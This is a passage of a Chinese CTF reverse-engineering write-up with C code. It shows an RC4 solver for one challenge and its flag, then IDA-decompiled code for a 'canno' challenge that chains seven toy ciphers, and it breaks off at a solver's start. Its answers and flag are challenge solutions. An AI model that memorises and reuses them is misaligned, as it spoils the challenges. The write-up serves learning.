<span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[] = &#123;</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xC4</span>, <span class="number">0xA0</span>, <span class="number">0x5A</span>, <span class="number">0xDE</span>, <span class="number">0xED</span>, <span class="number">0x62</span>, <span class="number">0x5E</span>, <span class="number">0x25</span>, <span class="number">0xE2</span>, <span class="number">0x6D</span>, <span class="number">0xA6</span>, <span class="number">0x05</span>, <span class="number">0xA7</span>, <span class="number">0x20</span>, <span class="number">0x8D</span>,</span><br><span class="line">    <span class="number">0x7D</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0x3E</span>, <span class="number">0x8C</span>, <span class="number">0xA7</span>, <span class="number">0x7F</span>, <span class="number">0xFA</span>, <span class="number">0x09</span>, <span class="number">0xD8</span>, <span class="number">0x62</span>, <span class="number">0xDB</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0xC2</span>, <span class="number">0xA9</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//10E70D20C9D7B5FF171710364C502E6A0EFF70CEF380835E605587810080C2A9A9</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key = <span class="number">0xF86D35D4</span>;</span><br><span class="line">    <span class="comment">//755FF0D3</span></span><br><span class="line">    <span class="type">char</span> v6;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= <span class="number">4</span>)</span><br><span class="line">            v6 = <span class="number">7</span> - i;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v6 = i;</span><br><span class="line">        keyk[i] = key &gt;&gt; (<span class="number">8</span> * v6);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//for (i = 0; i &lt; 8; i++)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    printf(&quot;%x &quot;, keyk[i]);</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        keybox[i] = keyk[i % <span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    rc4(keyk, <span class="number">8</span>, flag, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//NSSCTF&#123;Int3r3st1ng_5MC_Pr0gr@m?&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="canno"><a href="#canno" class="headerlink" title="canno"></a>canno</h2><p>就是考加解密的，拖进ida</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v4; <span class="comment">// r8</span></span><br><span class="line">    __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v7; <span class="comment">// r8</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// [rsp+20h] [rbp-1F8h]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp-1F4h]</span></span><br><span class="line">    <span class="type">int</span> v10; <span class="comment">// [rsp+28h] [rbp-1F0h]</span></span><br><span class="line">    <span class="type">int</span> v11[<span class="number">4</span>]; <span class="comment">// [rsp+30h] [rbp-1E8h]</span></span><br><span class="line">    __int64 v12; <span class="comment">// [rsp+40h] [rbp-1D8h]</span></span><br><span class="line">    __int64 v13; <span class="comment">// [rsp+48h] [rbp-1D0h]</span></span><br><span class="line">    __int64 v14; <span class="comment">// [rsp+50h] [rbp-1C8h]</span></span><br><span class="line">    <span class="type">int</span> v15[<span class="number">8</span>]; <span class="comment">// [rsp+58h] [rbp-1C0h]</span></span><br><span class="line">    <span class="type">int</span> v16[<span class="number">4</span>]; <span class="comment">// [rsp+78h] [rbp-1A0h]</span></span><br><span class="line">    <span class="type">char</span> input1[<span class="number">12</span>]; <span class="comment">// [rsp+88h] [rbp-190h] BYREF</span></span><br><span class="line">    <span class="type">char</span> input2[<span class="number">12</span>]; <span class="comment">// [rsp+94h] [rbp-184h] BYREF</span></span><br><span class="line">    <span class="type">char</span> input3[<span class="number">16</span>]; <span class="comment">// [rsp+A0h] [rbp-178h] BYREF</span></span><br><span class="line">    <span class="type">char</span> i1[<span class="number">112</span>]; <span class="comment">// [rsp+B0h] [rbp-168h] BYREF</span></span><br><span class="line">    <span class="type">char</span> i2[<span class="number">112</span>]; <span class="comment">// [rsp+120h] [rbp-F8h] BYREF</span></span><br><span class="line">    <span class="type">char</span> i3[<span class="number">112</span>]; <span class="comment">// [rsp+190h] [rbp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">    sub_7FF68C1A2470(<span class="string">&quot;Enter the flag: &quot;</span>, argv, envp);</span><br><span class="line">    sub_7FF68C1A24F0(<span class="string">&quot;%36s&quot;</span>, input1);             <span class="comment">// aaaaaaaaaaaabbbbbbbbbbbbcccccccccccc</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input1) == <span class="number">0x24</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strncpy</span>(i1, input1, <span class="number">0xCu</span>i64);</span><br><span class="line">        v12 = <span class="number">12</span>i64;</span><br><span class="line">        i1[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>(i2, input2, <span class="number">0xCu</span>i64);</span><br><span class="line">        v13 = <span class="number">12</span>i64;</span><br><span class="line">        i2[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>(i3, input3, <span class="number">0xCu</span>i64);</span><br><span class="line">        v14 = <span class="number">12</span>i64;</span><br><span class="line">        i3[<span class="number">12</span>] = <span class="number">0</span>;                                 <span class="comment">// 分三份</span></span><br><span class="line">        v15[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        v15[<span class="number">1</span>] = <span class="number">5</span>;</span><br><span class="line">        v15[<span class="number">2</span>] = <span class="number">6</span>;</span><br><span class="line">        v15[<span class="number">3</span>] = <span class="number">3</span>;</span><br><span class="line">        v15[<span class="number">4</span>] = <span class="number">4</span>;</span><br><span class="line">        v15[<span class="number">5</span>] = <span class="number">1</span>;</span><br><span class="line">        v15[<span class="number">6</span>] = <span class="number">4</span>;</span><br><span class="line">        v15[<span class="number">7</span>] = <span class="number">5</span>;</span><br><span class="line">        v16[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        v16[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        v16[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">        v11[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        v11[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        v11[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">3</span>; ++j )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( i &gt;= v16[j] )</span><br><span class="line">                &#123;</span><br><span class="line">                    v10 = v11[j];</span><br><span class="line">                    <span class="keyword">if</span> ( v10 &lt; <span class="number">8</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( j )</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> ( j == <span class="number">1</span> )</span><br><span class="line">                            &#123;</span><br><span class="line">                                crypt(i2, i3, v15[v10]);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> <span class="keyword">if</span> ( j == <span class="number">2</span> )</span><br><span class="line">                            &#123;</span><br><span class="line">                                crypt(i3, i1, v15[v10]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            crypt(i1, i2, v15[v10]);</span><br><span class="line">                        &#125;</span><br><span class="line">                        ++v11[j];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(i1, <span class="string">&quot;WgvDmssEvcY326bHo3nNro3vXvvfmgrz&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(i2, <span class="string">&quot;gX+Ri9PG=bt5=00B6hscPQOL&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(i3, <span class="string">&quot;T6bHgUPL2gXUd=xT=FNHtPzV&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            sub_7FF68C1A2470(<span class="string">&quot;Congratulations! You have found the flag!\n&quot;</span>, v6, v7);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            sub_7FF68C1A2470(<span class="string">&quot;Invalid flag!\n&quot;</span>, v6, v7);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_7FF68C1A2470(<span class="string">&quot;Invalid flag!\n&quot;</span>, v3, v4);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把输入拆成三部分(i1,i2,i3)，然后根据 j 012决定谁做key谁做密文，看加密函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">crypt</span><span class="params">(<span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-F8h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> j; <span class="comment">// [rsp+24h] [rbp-F4h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> lena1; <span class="comment">// [rsp+28h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> num6; <span class="comment">// [rsp+2Ch] [rbp-ECh]</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [rsp+30h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+34h] [rbp-E4h]</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+38h] [rbp-E0h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i1; <span class="comment">// [rsp+3Ch] [rbp-DCh]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+40h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">int</span> ii; <span class="comment">// [rsp+44h] [rbp-D4h]</span></span><br><span class="line">  <span class="type">int</span> jj; <span class="comment">// [rsp+48h] [rbp-D0h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v18; <span class="comment">// [rsp+4Ch] [rbp-CCh]</span></span><br><span class="line">  <span class="type">int</span> nn; <span class="comment">// [rsp+50h] [rbp-C8h]</span></span><br><span class="line">  <span class="type">int</span> kk; <span class="comment">// [rsp+54h] [rbp-C4h]</span></span><br><span class="line">  <span class="type">int</span> lena2; <span class="comment">// [rsp+58h] [rbp-C0h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [rsp+5Ch] [rbp-BCh]</span></span><br><span class="line">  <span class="type">int</span> mm; <span class="comment">// [rsp+60h] [rbp-B8h]</span></span><br><span class="line">  <span class="type">char</span> **Block; <span class="comment">// [rsp+68h] [rbp-B0h]</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [rsp+7Ch] [rbp-9Ch]</span></span><br><span class="line">  <span class="type">int</span> *a1_1; <span class="comment">// [rsp+88h] [rbp-90h]</span></span><br><span class="line">  <span class="type">int</span> *out2; <span class="comment">// [rsp+90h] [rbp-88h]</span></span><br><span class="line">  <span class="type">int</span> *out; <span class="comment">// [rsp+98h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> *Source; <span class="comment">// [rsp+A0h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> *v30; <span class="comment">// [rsp+A8h] [rbp-70h]</span></span><br><span class="line">  <span class="type">char</span> *v31; <span class="comment">// [rsp+B0h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> num[<span class="number">12</span>]; <span class="comment">// [rsp+B8h] [rbp-60h]</span></span><br><span class="line">  __int64 v33; <span class="comment">// [rsp+E8h] [rbp-30h]</span></span><br><span class="line">  __int64 v34; <span class="comment">// [rsp+F0h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  lena1 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  lena2 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">  <span class="keyword">switch</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; lena1; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = a2[i % lena2];</span><br><span class="line">        <span class="keyword">if</span> ( a1[i] &lt; <span class="number">65</span> || a1[i] &gt; <span class="number">90</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( a1[i] &lt; <span class="number">97</span> || a1[i] &gt; <span class="number">122</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( a1[i] &gt;= <span class="number">48</span> &amp;&amp; a1[i] &lt;= <span class="number">57</span> )</span><br><span class="line">              a1[i] = (a1[i] + v22 - <span class="number">48</span>) % <span class="number">10</span> + <span class="number">48</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            a1[i] = (a1[i] + v22 - <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          a1[i] = (a1[i] + v22 - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      num[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">      num[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">      num[<span class="number">2</span>] = <span class="number">5</span>;</span><br><span class="line">      num[<span class="number">3</span>] = <span class="number">7</span>;</span><br><span class="line">      num[<span class="number">4</span>] = <span class="number">9</span>;</span><br><span class="line">      num[<span class="number">5</span>] = <span class="number">11</span>;</span><br><span class="line">      num[<span class="number">6</span>] = <span class="number">15</span>;</span><br><span class="line">      num[<span class="number">7</span>] = <span class="number">17</span>;</span><br><span class="line">      num[<span class="number">8</span>] = <span class="number">19</span>;</span><br><span class="line">      num[<span class="number">9</span>] = <span class="number">21</span>;</span><br><span class="line">      num[<span class="number">10</span>] = <span class="number">23</span>;</span><br><span class="line">      num[<span class="number">11</span>] = <span class="number">25</span>;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; lena1; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a1[j] &lt; <span class="number">65</span> || a1[j] &gt; <span class="number">90</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( a1[j] &gt;= <span class="number">97</span> &amp;&amp; a1[j] &lt;= <span class="number">122</span> )</span><br><span class="line">            a1[j] = (a2[j % lena2] + num[j % <span class="number">12</span>] * (a1[j] - <span class="number">97</span>)) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          a1[j] = (a2[j % lena2] + num[j % <span class="number">12</span>] * (a1[j] - <span class="number">65</span>)) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      num6 = *a2 % <span class="number">10</span> + <span class="number">2</span>;</span><br><span class="line">      v33 = num6;</span><br><span class="line">      Block = <span class="built_in">malloc</span>(saturated_mul(num6, <span class="number">8u</span>i64));</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; num6; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        Block[k] = <span class="built_in">malloc</span>(lena1 + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">memset</span>(Block[k], <span class="number">0</span>, lena1 + <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0</span>; num6 * m &lt; lena1; ++m )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt; num6 &amp;&amp; n + num6 * m &lt; lena1; ++n )</span><br><span class="line">          Block[n][m] = a1[n + num6 * m];</span><br><span class="line">      &#125;</span><br><span class="line">      v18 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt; num6; ++ii )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt; m; ++jj )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( Block[ii][jj] &amp;&amp; v18 &lt; lena1 )</span><br><span class="line">            a1[v18++] = Block[ii][jj];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      a1[v18] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( kk = <span class="number">0</span>; kk &lt; num6; ++kk )</span><br><span class="line">        <span class="built_in">free</span>(Block[kk]);</span><br><span class="line">      <span class="built_in">free</span>(Block);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      v25 = *a2 % <span class="number">10</span> + <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">for</span> ( mm = <span class="number">0</span>; mm &lt; v25; ++mm )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = a1[lena1 - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> ( nn = lena1 - <span class="number">1</span>; nn &gt; <span class="number">0</span>; --nn )</span><br><span class="line">          a1[nn] = a1[nn - <span class="number">1</span>];</span><br><span class="line">        *a1 = v11;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      v34 = lena1;</span><br><span class="line">      a1_1 = <span class="built_in">malloc</span>(saturated_mul(lena1, <span class="number">4u</span>i64));</span><br><span class="line">      <span class="keyword">for</span> ( i1 = <span class="number">0</span>; i1 &lt; lena1; ++i1 )</span><br><span class="line">        a1_1[i1] = (a2[i1 % lena2] + <span class="number">57</span>) ^ a1[i1];</span><br><span class="line">      Source = base64(a1_1, lena1);</span><br><span class="line">      <span class="built_in">strcpy</span>(a1, Source);</span><br><span class="line">      <span class="built_in">free</span>(a1_1);</span><br><span class="line">      <span class="built_in">free</span>(Source);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      v3 = saturated_mul(<span class="built_in">strlen</span>(a1), <span class="number">4u</span>i64);</span><br><span class="line">      out2 = <span class="built_in">malloc</span>(v3);</span><br><span class="line">      rc4(a1, a2, out2);</span><br><span class="line">      v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">      v30 = base64(out2, v4);</span><br><span class="line">      <span class="built_in">strcpy</span>(a1, v30);</span><br><span class="line">      <span class="built_in">free</span>(out2);</span><br><span class="line">      <span class="built_in">free</span>(v30);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      v5 = saturated_mul(<span class="built_in">strlen</span>(a1), <span class="number">4u</span>i64);</span><br><span class="line">      out = <span class="built_in">malloc</span>(v5);</span><br><span class="line">      rc4_0(a1, a2, out);</span><br><span class="line">      v6 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">      v31 = base64(out, v6);</span><br><span class="line">      <span class="built_in">strcpy</span>(a1, v31);</span><br><span class="line">      <span class="built_in">free</span>(out);</span><br><span class="line">      <span class="built_in">free</span>(v31);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到根据前文的v15来决定这里是哪种加密，一共7种case，所以先模拟出每一种的j对应的case，然后写每一种的解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 